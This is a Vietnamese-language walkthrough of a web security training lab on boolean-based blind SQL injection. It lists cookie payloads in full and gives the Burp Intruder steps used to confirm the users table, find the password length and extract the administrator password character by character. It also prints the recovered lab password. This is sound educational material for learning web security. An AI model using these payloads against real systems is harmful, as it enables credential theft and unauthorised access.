# Lab11: Blind SQL injection (conditional/boolean-based)

Mục tiêu: Khai thác lỗ hổng Blind SQL Injection (boolean/conditional responses) trên cookie TrackingId để tìm mật khẩu của user administrator và đăng nhập với tài khoản đó.

Tóm tắt ngắn:

- Ứng dụng lấy giá trị cookie TrackingId và đưa trực tiếp vào một truy vấn SQL.
- Kết quả truy vấn không được trả về trực tiếp và không có lỗi hiển thị, nhưng trang sẽ hiển thị "Welcome back!" nếu truy vấn trả về ít nhất một hàng.
- Dựa vào việc "Welcome back!" xuất hiện hay không, ta có thể suy ra kết quả của các điều kiện SQL (TRUE / FALSE) và từ đó rút trích dữ liệu từng ký tự.

Các bước giải:

-Bước 1: Mở trang chính và bắt request chứa cookie TrackingId

- Truy cập trang front page của shop bằng trình duyệt đã cấu hình proxy (Burp).
- Bật Intercept trong Burp và nạp lại trang để bắt request. Ghi lại giá trị TrackingId ban đầu (ví dụ TrackingId=xyz).
- ![A screenshot of a computer](./image/Picture1.png)

-Bước 2: Kiểm tra điều kiện boolean đơn giản

- Thử sửa cookie để kiểm tra phản hồi TRUE:
  - Thiết lập cookie thành:
    TrackingId=xyz' AND '1'='1
  - Gửi request và kiểm tra xem trang trả về có chứa "Welcome back" không — nếu có, điều kiện TRUE.
- ![A screenshot of a computer](./image/Picture3.png)
- Thử điều kiện FALSE:
  - TrackingId=xyz' AND '1'='2
  - Gửi request và kiểm tra: "Welcome back" không xuất hiện — điều kiện FALSE.
- Việc này xác nhận bạn có thể kiểm tra các điều kiện boolean bằng cách sửa cookie.
- ![A screenshot of a computer](./image/Picture4.png)

-Bước 3: Xác nhận tồn tại bảng users và user administrator

- Kiểm tra có bảng users hay không:
  - TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
  - Nếu "Welcome back" xuất hiện → tồn tại bảng users.
- ![A screenshot of a computer](./image/Picture5.png)
- Kiểm tra có user administrator:
  - TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
  - Nếu "Welcome back" xuất hiện → tồn tại user administrator.
- ![A screenshot of a computer](./image/Picture6.png)

-Bước 4: Tìm độ dài mật khẩu của administrator

- Kiểm tra liệu mật khẩu dài hơn một giá trị nào đó:
  - Ví dụ kiểm tra >1:
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
  - Nếu TRUE thì mật khẩu dài hơn 1 ký tự.
  - ![A screenshot of a computer](./image/Picture7.png)
- Lặp tăng dần giá trị n (2,3,4...,20) và gửi request cho đến khi điều kiện trở thành FALSE — lúc đó bạn biết độ dài chính xác. (Trong lab này, mật khẩu dài 20 ký tự.)
- Có thể dùng Burp Repeater để thử tay từng giá trị.
- ![A screenshot of a computer](./image/Picture8.png)
- ![A screenshot of a computer](./image/Picture9.png)
  -Bước 5: Rút trích từng ký tự bằng Burp Intruder
- Vì cần nhiều request để thử từng ký tự, sử dụng Burp Intruder sẽ nhanh hơn.
  1. Từ request đang làm việc, chọn Send to Intruder.
  2. Trong Intruder, chỉnh cookie TrackingId thành dạng kiểm tra ký tự, ví dụ kiểm tra ký tự đầu:
     TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
     (Hàm SUBSTRING có thể là SUBSTR/SUBSTRING tùy DBMS; ở MySQL dùng SUBSTRING(...,pos,1).)
  3. Chọn vị trí payload: bôi đen ký tự a ở cuối và click Add § → cookie trở thành:
     TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
  4. Trong tab Payloads, chọn Simple list. Thêm danh sách payload là các ký tự khả dĩ trong mật khẩu.
     - Theo hướng dẫn, mật khẩu chỉ gồm lowercase alphanumeric → thêm a–z và 0–9.
     - Dùng Add from list để thêm nhanh các ký tự.
  5. Để biết payload nào đúng, bật Grep theo chuỗi "Welcome back":
     - Vào Settings → Grep - Match → xóa các mục hiện có → thêm: Welcome back
  6. Start attack.
  7. Trong kết quả attack, sẽ có cột Grep/Welcome back; hàng nào có tick nghĩa là payload đó làm điều kiện TRUE ⇒ ký tự đúng cho vị trí 1.
- ![A screenshot of a computer](./image/Picture10.png)

-Bước 6: Lặp cho từng vị trí

- Thay đổi offset trong payload từ 1 → 2 → 3 ... đến độ dài đã xác định (ví dụ 20).
  - Ví dụ cho vị trí 2:
    TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
- Ghi lại ký tự đúng cho mỗi vị trí để ghép thành mật khẩu đầy đủ.
- ![A screenshot of a computer](./image/Picture11.png)
- ![A screenshot of a computer](./image/Picture12.png)
- ![A screenshot of a computer](./image/Picture13.png)
- ![A screenshot of a computer](./image/Picture14.png)
- ![A screenshot of a computer](./image/Picture15.png)
- ![A screenshot of a computer](./image/Picture16.png)
- ![A screenshot of a computer](./image/Picture17.png)
- ![A screenshot of a computer](./image/Picture18.png)
- ![A screenshot of a computer](./image/Picture19.png)
- ![A screenshot of a computer](./image/Picture20.png)
- ![A screenshot of a computer](./image/Picture21.png)
- ![A screenshot of a computer](./image/Picture22.png)
- ![A screenshot of a computer](./image/Picture23.png)
- ![A screenshot of a computer](./image/Picture24.png)
- ![A screenshot of a computer](./image/Picture25.png)
- ![A screenshot of a computer](./image/Picture26.png)
- ![A screenshot of a computer](./image/Picture27.png)
- ![A screenshot of a computer](./image/Picture28.png)
- ![A screenshot of a computer](./image/Picture29.png)
- ![A screenshot of a computer](./image/Picture30.png)
- Tới câu lệnh TrackingId=xyz' AND (SELECT SUBSTRING(password,21,1) FROM users WHERE username='administrator')='§a§, ta không dò được giá trị true ở cột welcome nên ta bỏ kết quả l suy ra được chuỗi kết quả là: cgoo7i6qquusajauec48
  -Bước 7: Đăng nhập bằng tài khoản administrator
- Mở My account → Login.
- Dùng username = administrator và mật khẩu vừa rút trích được để đăng nhập.
- Sau khi đăng nhập thành công, lab sẽ được hoàn thành.
- ![A screenshot of a computer](./image/Picture31.png)
  Kết luận:
- Kỹ thuật boolean-based blind SQLi dùng sự khác biệt trong phản hồi (ở đây là "Welcome back") để suy ra dữ liệu bên trong DB.
- Bằng cách kiểm tra độ dài rồi từng ký tự (với Intruder), ta rút trích được mật khẩu administrator và đăng nhập để hoàn thành lab.
